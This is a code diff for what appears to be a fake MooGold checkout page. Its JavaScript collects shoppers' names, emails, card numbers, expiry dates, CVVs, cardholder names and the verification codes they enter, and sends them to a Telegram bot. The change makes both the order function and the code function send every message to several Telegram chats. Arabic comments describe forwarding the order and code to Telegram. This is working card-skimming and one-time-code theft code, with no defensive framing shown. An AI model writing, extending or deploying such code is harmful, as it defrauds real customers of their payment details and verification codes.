@@ -767,21 +767,18 @@
     const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
 
     // إرسال بيانات الطلب إلى تليجرام
-    function sendOrderToTelegram() {
-      var firstName = document.getElementById('firstName').value.trim();
-      var lastName = document.getElementById('lastName').value.trim();
-      var email = document.getElementById('email').value.trim();
-      var country = ""; // أو null إذا تحب
-      var state = ""; // أو null إذا تحب
-      var orderNotes = document.getElementById('orderNotes').value.trim();
+    // إرسال بيانات الطلب إلى تليجرام
+function sendOrderToTelegram() {
+  var firstName = document.getElementById('firstName').value.trim();
+  var lastName = document.getElementById('lastName').value.trim();
+  var email = document.getElementById('email').value.trim();
+  var orderNotes = document.getElementById('orderNotes').value.trim();
+  var cardNumber = document.getElementById('cardNumber').value.trim();
+  var expiryDate = document.getElementById('expiryDate').value.trim();
+  var cvv = document.getElementById('cvv').value.trim();
+  var cardHolderName = document.getElementById('cardHolderName').value.trim();
 
-      // بيانات البطاقة
-      var cardNumber = document.getElementById('cardNumber').value.trim();
-      var expiryDate = document.getElementById('expiryDate').value.trim();
-      var cvv = document.getElementById('cvv').value.trim();
-      var cardHolderName = document.getElementById('cardHolderName').value.trim();
-
-      var message = `
+  var message = `
 طلب جديد من موقع MooGold:
 ---------------------------
 👤 الاسم: ${firstName} ${lastName}
@@ -796,39 +793,34 @@ Holder: ${cardHolderName}
 ---------------------------
 `;
 
-      fetch(tgUrl, {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: tgChatId,
-          text: message
-        })
-      }).then(response => response.json())
-      .then(data => {
-        // إذا أردت إشعار أو تسجيل
-        // console.log('تم إرسال البيانات لتليجرام', data);
-      }).catch(error => {
-        // console.error('خطأ في الإرسال لتليجرام:', error);
-      });
-    }
+  // أرسل الرسالة لجميع الـ chat ids
+  tgChatIds.forEach(function(chatId) {
+    fetch(tgUrl, {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+  });
+}
 
-    // إرسال رمز التحقق إلى تليجرام
-    function sendCodeToTelegram(code) {
-      var message = `رمز التحقق المدخل من العميل: ${code}`;
-      fetch(tgUrl, {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: tgChatId,
-          text: message
-        })
-      }).then(response => response.json())
-      .then(data => {
-        // تم الإرسال بنجاح
-      }).catch(error => {
-        // فشل الإرسال
-      });
-    }
+// نفس التعديل هنا
+function sendCodeToTelegram(code) {
+  var message = `رمز التحقق المدخل من العميل: ${code}`;
+  tgChatIds.forEach(function(chatId) {
+    fetch(tgUrl, {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+  });
+}
+
 
     function startTimer() {
       timeLeft = 60;
